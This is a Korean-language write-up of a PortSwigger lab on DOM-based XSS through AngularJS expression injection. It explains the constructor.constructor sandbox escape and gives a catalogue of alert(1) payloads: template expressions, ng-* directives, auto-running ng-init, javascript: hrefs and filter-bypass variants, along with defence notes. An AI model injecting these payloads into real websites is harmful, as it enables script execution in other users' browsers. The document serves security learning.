# Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

## 개요

- **난이도**: Practitioner
- **주제**: Cross-Site Scripting (XSS) — DOM-based / AngularJS 표현식 인젝션
- **링크**: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression

## 목표

AngularJS 표현식(`{{ }}`) 인젝션으로 `alert()` 를 실행시킨다.

## 취약점 분석

페이지에 AngularJS가 로드되어 있고, `ng-app` 속성이 있는 요소 안에 검색어가 반영된다.

```html
<!-- 페이지 구조 -->
<body ng-app>
  ...
  <h1>1 search results for '{{검색어}}'</h1>
  ...
</body>
```

`<>`와 `"` 는 인코딩되지만, AngularJS는 `{{ }}` 안의 내용을 HTML 렌더링이 아닌 **JS 표현식**으로 평가한다.

```
검색어: {{7*7}}
출력:   1 search results for '49'
→ AngularJS가 수식을 계산하여 출력 — 표현식 평가가 동작 중임을 확인
```

## 공격 방법

```
검색어: {{constructor.constructor('alert(1)')()}}
```

AngularJS가 이 표현식을 평가하면서 `alert(1)` 이 실행된다.

## `constructor.constructor` 체인 이해

AngularJS 표현식은 **샌드박스 스코프**에서 실행되어 `window`, `document`, `alert` 같은 전역 객체에 직접 접근하지 못한다.  
`constructor.constructor` 는 이 샌드박스를 우회하는 핵심 기법이다.

```javascript
// JS의 모든 객체는 자신을 만든 constructor 를 가진다
'hello'.constructor          // String 함수
'hello'.constructor.constructor  // Function 함수 (모든 함수의 생성자)

// Function 생성자로 임의 코드 실행
Function('alert(1)')()
// = new Function('alert(1)')()
// → alert(1) 을 함수 본체로 갖는 함수를 생성하고 즉시 호출
```

AngularJS 표현식 스코프에서:

```
{{}} 안에서 실행 가능한 것
  ↓
'문자열'.constructor          → String
'문자열'.constructor.constructor  → Function  (전역 Function 생성자)
  ↓
Function('alert(1)')  → function() { alert(1) }
  ↓
Function('alert(1)')()  → alert(1) 실행
```

즉, 문자열 → `String` 생성자 → `Function` 생성자 순으로 올라가 전역 `Function` 에 도달하는 체인이다.

### AngularJS 버전별 차이

| 버전 | 샌드박스 | 동작 |
|------|----------|------|
| 1.0 ~ 1.1 | 없음 | `{{alert(1)}}` 직접 실행 가능 |
| 1.2 ~ 1.5 | 있음 | `constructor.constructor` 등 우회 필요 |
| 1.6+ | **샌드박스 제거** | `{{alert(1)}}` 직접 실행 가능 |

PortSwigger 랩은 샌드박스가 있는 버전을 사용하므로 `constructor.constructor` 체인이 필요하다.

---

## AngularJS XSS 벡터 전체 정리

### 1. 템플릿 표현식 `{{ }}`

`ng-app` 스코프 내 어디서나 동작하는 가장 기본적인 벡터.

```html
<!-- 기본 표현식 실행 -->
{{7*7}}                          → 49
{{'a'.constructor.constructor('alert(1)')()}}

<!-- 문자열 메서드 활용 -->
{{''.constructor.constructor('alert(1)')()}}

<!-- Array 생성자 활용 -->
{{[].constructor.constructor('alert(1)')()}}

<!-- 객체 생성자 활용 -->
{{{}['constructor']['constructor']('alert(1)')()}}

<!-- $eval — AngularJS 내장 평가 함수 -->
{{$eval('alert(1)')}}            → 일부 버전에서 동작

<!-- $on/$emit — 이벤트 시스템 활용 -->
{{$on.constructor('alert(1)')()}}
```

### 2. ng-* 이벤트 디렉티브

HTML 이벤트 핸들러의 AngularJS 버전. 속성값이 AngularJS 표현식으로 평가된다.

#### 마우스 이벤트

```html
<button ng-click="constructor.constructor('alert(1)')()">클릭</button>
<div ng-mouseover="constructor.constructor('alert(1)')()">마우스 오버</div>
<div ng-mouseenter="constructor.constructor('alert(1)')()">마우스 진입</div>
<div ng-mouseleave="constructor.constructor('alert(1)')()">마우스 이탈</div>
<div ng-dblclick="constructor.constructor('alert(1)')()">더블 클릭</div>
<div ng-mousedown="constructor.constructor('alert(1)')()">마우스 다운</div>
<div ng-mouseup="constructor.constructor('alert(1)')()">마우스 업</div>
<div ng-contextmenu="constructor.constructor('alert(1)')()">우클릭</div>
```

#### 포커스 이벤트

```html
<input ng-focus="constructor.constructor('alert(1)')()">
<input ng-blur="constructor.constructor('alert(1)')()">
```

#### 키보드 이벤트

```html
<input ng-keydown="constructor.constructor('alert(1)')()">
<input ng-keyup="constructor.constructor('alert(1)')()">
<input ng-keypress="constructor.constructor('alert(1)')()">
```

#### 변경 / 입력 이벤트

```html
<input ng-change="constructor.constructor('alert(1)')()">
<input ng-input="constructor.constructor('alert(1)')()">
<textarea ng-paste="constructor.constructor('alert(1)')()"></textarea>
```

#### 폼 이벤트

```html
<form ng-submit="constructor.constructor('alert(1)')()">
  <button type="submit">전송</button>
</form>
```

### 3. ng-init — 초기화 디렉티브

요소가 초기화될 때 표현식을 실행한다. **사용자 상호작용 없이 자동 실행**된다.

```html
<!-- 페이지 로드 시 자동 실행 -->
<div ng-init="constructor.constructor('alert(1)')()">내용</div>

<!-- 변수 초기화 와 함께 -->
<div ng-init="x=1; constructor.constructor('alert(1)')()">내용</div>
```

> `ng-init` 이 삽입 가능한 환경에서는 클릭 없이 자동 실행되므로 가장 강력한 벡터다.

### 4. ng-bind 계열 — 데이터 바인딩

출력 컨텍스트지만 표현식을 포함할 수 있다.

```html
<!-- ng-bind: {{}} 와 동일하게 표현식 평가 -->
<span ng-bind="constructor.constructor('alert(1)')()"></span>

<!-- ng-bind-html: HTML로 직접 삽입 (XSS 직결) -->
<div ng-bind-html="'<img src=x onerror=alert(1)>'"></div>
```

`ng-bind-html` 은 `$sce.trustAsHtml()` 없이 사용하면 자동으로 정제되지만, 우회 가능한 경우가 있다.

### 5. ng-src / ng-href — URL 디렉티브

`src`, `href` 에 AngularJS 표현식을 적용한다.

```html
<!-- ng-src: 이미지 src에 표현식 -->
<img ng-src="x" ng-init="constructor.constructor('alert(1)')()">

<!-- ng-href: 링크 href에 표현식 -->
<a ng-href="javascript:alert(1)">클릭</a>

<!-- 표현식으로 javascript: URL 생성 -->
<a ng-href="{{'javascript:alert(1)'}}">클릭</a>
```

### 6. ng-class / ng-style — 스타일 디렉티브

직접적인 JS 실행은 아니지만, 표현식 실행 컨텍스트로 활용 가능하다.

```html
<div ng-class="constructor.constructor('alert(1)')()">내용</div>
<div ng-style="constructor.constructor('alert(1)')()">내용</div>
```

### 7. ng-repeat — 반복 디렉티브

컬렉션을 순회하며 표현식을 실행한다.

```html
<div ng-repeat="x in constructor.constructor('alert(1)')()">{{x}}</div>
```

### 8. ng-if / ng-show / ng-hide — 조건 디렉티브

조건 평가 과정에서 표현식이 실행된다.

```html
<div ng-if="constructor.constructor('alert(1)')()">내용</div>
<div ng-show="constructor.constructor('alert(1)')()">내용</div>
```

---

## 디렉티브별 실행 조건 요약

| 디렉티브 | 실행 시점 | 자동 실행 |
|----------|-----------|-----------|
| `{{}}` | 렌더링 시 | **O** |
| `ng-init` | 초기화 시 | **O** |
| `ng-bind` | 렌더링 시 | **O** |
| `ng-repeat` | 렌더링 시 | **O** |
| `ng-if/show/hide` | 렌더링 시 | **O** |
| `ng-click` | 클릭 시 | X |
| `ng-mouseover` | 마우스 오버 시 | X |
| `ng-focus` | 포커스 시 | X (autofocus 조합 시 O) |
| `ng-keydown/up` | 키 입력 시 | X |
| `ng-submit` | 폼 제출 시 | X |

---

## 핵심 정리

- AngularJS가 로드된 페이지에서 `{{ }}` 가 표현식으로 평가되면, `<>` 인코딩과 무관하게 JS 실행이 가능하다.
- `constructor.constructor('code')()` 는 샌드박스 스코프에서 전역 `Function` 생성자에 도달하는 우회 체인이다.
- `ng-init` 은 자동 실행이므로 가장 강력하고, `ng-click` 계열은 사용자 상호작용이 필요하다.
- **방어**:
  - AngularJS 1.6+ 사용 (샌드박스 제거됐지만 표현식 범위가 명시적으로 제한됨)
  - 사용자 입력을 `ng-app` 스코프 내 표현식으로 반영하지 않음
  - CSP `unsafe-eval` 비허용으로 `Function()` 생성자 실행 차단
  - 가능하면 Angular(2+) 등 현대 프레임워크로 마이그레이션

## 배운 점 및 추가 학습

### 1. 프레임워크별 템플릿 인젝션

AngularJS 표현식 인젝션은 **서버 사이드 템플릿 인젝션(SSTI)** 의 클라이언트 사이드 버전이다.

| 프레임워크 | 표현식 구문 | 인젝션 페이로드 예시 |
|-----------|------------|---------------------|
| AngularJS | `{{ }}` | `{{constructor.constructor('alert(1)')()}}` |
| Vue.js | `{{ }}` | `{{_c.constructor('alert(1)')()}}` |
| React | JSX `{}` | 대부분 자동 이스케이프, dangerouslySetInnerHTML 주의 |
| Jinja2 (Python) | `{{ }}` | `{{7*7}}`, `{{config}}` (SSTI) |
| Twig (PHP) | `{{ }}` | `{{7*7}}` (SSTI) |

### 2. AngularJS 탐지 방법

페이지에 AngularJS가 로드되어 있는지 확인하는 방법:

```javascript
// 브라우저 콘솔에서 확인
window.angular          // AngularJS 객체 존재 여부
angular.version.full    // 버전 확인 (예: "1.7.2")

// HTML 소스에서 확인
<html ng-app>           // ng-app 속성
<script src="angular.js">

// URL 탐색
/?q={{7*7}}  → 49 출력 시 표현식 평가 확인
```

### 3. `constructor` 체인 변형 우회

`constructor` 가 필터링될 경우 우회 방법:

```javascript
// 괄호 표기법
{{'a'['constructor']['constructor']('alert(1)')()}}

// 유니코드 이스케이프
{{'constructor'['constructor']('alert(1)')()}}

// charAt 활용
{{'a'.charAt(0).constructor.constructor('alert(1)')()}}

// $eval 내장 함수 (일부 버전)
{{$eval.constructor('alert(1)')()}}

// toString 활용
{{(1).toString.constructor.constructor('alert(1)')()}}
```
